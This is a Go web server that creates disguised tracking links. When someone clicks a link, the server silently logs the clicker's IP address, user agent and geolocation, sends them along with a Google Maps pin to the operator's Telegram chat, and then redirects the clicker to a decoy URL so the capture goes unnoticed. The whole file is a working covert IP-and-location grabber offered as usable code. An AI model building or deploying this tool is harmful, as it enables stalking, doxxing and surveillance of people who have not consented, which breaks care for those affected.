package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"time"

	"github.com/gin-gonic/gin"
)

type LinkData struct {
	DecoyURL string `json:"decoyUrl"`
}

var linkStore = make(map[string]string)

var telegramBotToken = os.Getenv("TELEGRAM_BOT_TOKEN")
var telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")

func generateID() string {
	rand.Seed(time.Now().UnixNano())
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, 8)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func sendTelegramMessage(message string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
	payload := map[string]string{
		"chat_id":    telegramChatID,
		"text":       message,
		"parse_mode": "Markdown",
	}
	jsonPayload, _ := json.Marshal(payload)
	_, _ = http.Post(url, "application/json", bytes.NewBuffer(jsonPayload))
}

func generateLink(c *gin.Context) {
	var data LinkData
	if err := c.BindJSON(&data); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	id := generateID()
	linkStore[id] = data.DecoyURL
	c.JSON(http.StatusOK, gin.H{"link": fmt.Sprintf("http://localhost:8080/t/%s", id)})
}

func redirectHandler(c *gin.Context) {
	id := c.Param("id")
	decoyURL, exists := linkStore[id]
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Link not found"})
		return
	}

	ip := c.ClientIP()
	userAgent := c.Request.UserAgent()

	geoResp, err := http.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		log.Printf("Geo lookup failed: %v", err)
		geoResp = nil
	}
	defer func() {
		if geoResp != nil {
			_ = geoResp.Body.Close()
		}
	}()

	var geo map[string]interface{}
	if geoResp != nil && geoResp.StatusCode == 200 {
		_ = json.NewDecoder(geoResp.Body).Decode(&geo)
	}

	logEntry := fmt.Sprintf("Time: %s\nIP: %s\nUser-Agent: %s\nLocation: %v\n-------------------------\n",
		time.Now().Format(time.RFC1123), ip, userAgent, geo)
	f, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	f.WriteString(logEntry)

	lat, latOK := geo["lat"].(float64)
	lon, lonOK := geo["lon"].(float64)
	mapsLink := ""
	if latOK && lonOK {
		mapsLink = fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%.6f,%.6f)", lat, lon)
	}

	telegramMsg := fmt.Sprintf("📍 *Tracking Link Clicked!*\nIP: `%s`\nUser-Agent: `%s`\nLocation: %v\n%s",
		ip, userAgent, geo, mapsLink)
	sendTelegramMessage(telegramMsg)

	c.Redirect(http.StatusTemporaryRedirect, decoyURL)
}

func main() {
	r := gin.Default()

	r.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}
		c.Next()
	})

	r.POST("/api/generate", generateLink)
	r.GET("/t/:id", redirectHandler)
	fmt.Println("Server started at http://localhost:8080")
	r.Run("0.0.0.0:8080")
}
